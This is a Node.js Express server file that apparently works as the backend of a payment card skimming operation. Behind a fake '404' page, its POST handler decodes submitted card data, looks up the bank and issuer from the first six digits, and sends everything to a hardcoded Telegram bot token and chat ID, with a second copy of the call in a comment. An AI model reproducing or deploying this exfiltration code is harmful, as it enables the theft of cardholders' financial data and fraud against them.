const express = require("express");
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3001;
app.use(express.json());
app.get("/", (req, res) => res.type("html").send(html));

app.post("/", (req, res) => {
  let bindata = JSON.parse(fs.readFileSync('data.json'))
  console.log(req.body);
  console.log("POST");
  let b64string = req.body['data'];
  let data = Buffer.from(b64string, "base64");
  let formattedData = data.toString().split(".").join(" | ");
  console.log(formattedData);
  // fetch(
  //   "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" +
  //     formattedData + '```'
  // );

  try {
    let bin_data = bindata[formattedData.slice(0, 6)];
    let formatted_bin_data = `${bin_data['Country']} | ${bin_data['Bank']} ${bin_data['Processor']} ${bin_data['Rank']} ${bin_data['Level']}`
    fetch(
      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" + '-----------------------------------'  + "%0A" + formattedData + "%0A%0A" + formatted_bin_data + '%0A-----------------------------------' + "```"
    );
    res.json(bin_data);
  } catch (error) {
    res.json({ data: "Error" });
  }
});

const server = app.listen(port, () =>
  console.log(`Example app listening on port ${port}!`)
);

server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;

const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Hello from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      404
    </section>
  </body>
</html>
`;
